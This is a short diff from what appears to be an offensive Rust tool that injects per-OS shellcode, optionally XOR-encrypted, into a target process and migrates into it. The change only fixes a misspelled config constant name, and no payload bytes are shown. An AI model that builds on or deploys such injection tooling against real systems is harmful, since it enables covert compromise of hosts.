@@ -9,7 +9,7 @@ use rco_process_migration_linux::inject_and_migrate;
 #[cfg(all(target_os = "linux", not(features = "xor")))]
 const SHELLCODE: &[u8] = rco_config::LINUX_SHELLCODE;
 #[cfg(all(target_os = "linux", not(features = "xor")))]
-const TARGET_PROCESS: &[u8] = rco_config::LINUX_MIRGATION_TARGET.as_bytes();
+const TARGET_PROCESS: &[u8] = rco_config::LINUX_MIGRATION_TARGET.as_bytes();
 #[cfg(all(target_os = "linux", features = "xor"))]
 const SHELLCODE: &[u8] = rco_config::ENCRYPTED_LINUX_SHELLCODE;
 #[cfg(all(target_os = "linux", features = "xor"))]
@@ -24,7 +24,7 @@ use rco_process_migration_windows::inject_and_migrate;
 #[cfg(all(windows, not(features = "xor")))]
 const SHELLCODE: &[u8] = rco_config::WINDOWS_SHELLCODE;
 #[cfg(all(windows, not(features = "xor")))]
-const TARGET_PROCESS: &[u8] = rco_config::WINDOWS_MIRGATION_TARGET.as_bytes();
+const TARGET_PROCESS: &[u8] = rco_config::WINDOWS_MIGRATION_TARGET.as_bytes();
 #[cfg(all(windows, features = "xor"))]
 const SHELLCODE: &[u8] = rco_config::ENCRYPTED_WINDOWS_SHELLCODE;
 #[cfg(all(windows, features = "xor"))]
